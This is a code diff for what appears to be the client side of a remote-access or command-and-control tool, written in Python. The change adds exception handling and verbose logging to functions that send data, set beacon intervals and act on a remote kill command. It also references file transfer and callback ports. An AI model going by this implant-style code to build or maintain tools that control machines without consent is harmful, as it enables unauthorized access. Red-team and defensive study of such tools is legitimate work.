@@ -166,8 +166,10 @@ def send_data(conn, plain_text):
     msg = plain_text + "[END]"
     try:
         conn.send(msg.encode('utf-8'))
-    except:
+    except Exception as e:
         if VERBOSE:
+            print(e)
+            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
             print_fail("Connection Interrupted - Unable to Send")
     if VERBOSE:
         print_info("Sent:\n"  +plain_text)
@@ -214,25 +216,35 @@ def file_transfer_put(conn, file_name):     #download from server - response fro
 def beacon(conn, data):
     global BEACON_INTERVAL_SETTING
     global BEACON_INTERVAL_MEM
-    temp = data.strip("[BEACON]")
-    if temp == "?":
-        send_data(conn, BEACON_INTERVAL_SETTING)
-    elif temp.isdigit():
-        BEACON_INTERVAL_MEM = int(data.strip("[BEACON]"))
-        BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
-        send_data(conn, "Beacon Setting: {} seconds".format(BEACON_INTERVAL_SETTING))
-    elif temp == "START":
+    try:
+        temp = data.strip("[BEACON]")
+        if temp == "?":
+            send_data(conn, BEACON_INTERVAL_SETTING)
+        elif temp.isdigit():
+            BEACON_INTERVAL_MEM = int(data.strip("[BEACON]"))
+            BEACON_INTERVAL_SETTING = BEACON_INTERVAL_MEM
+            send_data(conn, "Beacon Setting: {} seconds".format(BEACON_INTERVAL_SETTING))
+        elif temp == "START":
+            if VERBOSE:
+                print_info("Received Beacon Instruction")
+            conn.close()
+            BEACON_INTERVAL_MEM = None
+            raise ConnectionResetError
+    except Exception as e:
         if VERBOSE:
-            print_info("Received Beacon Instruction")
-        conn.close()
-        BEACON_INTERVAL_MEM = None
-        raise ConnectionResetError
+            print(e)
+            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
 def kill_term(conn):
-    if VERBOSE:
-        print_warn("Received kill command")
-    conn.close()
-    kill(getpid(), SIGTERM)
+    try:
+        if VERBOSE:
+            print_warn("Received kill command")
+        conn.close()
+        kill(getpid(), SIGTERM)
+    except Exception as e:
+        if VERBOSE:
+            print(e)
+            print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))
 
 def callback_port(conn,data):
     global remote_port
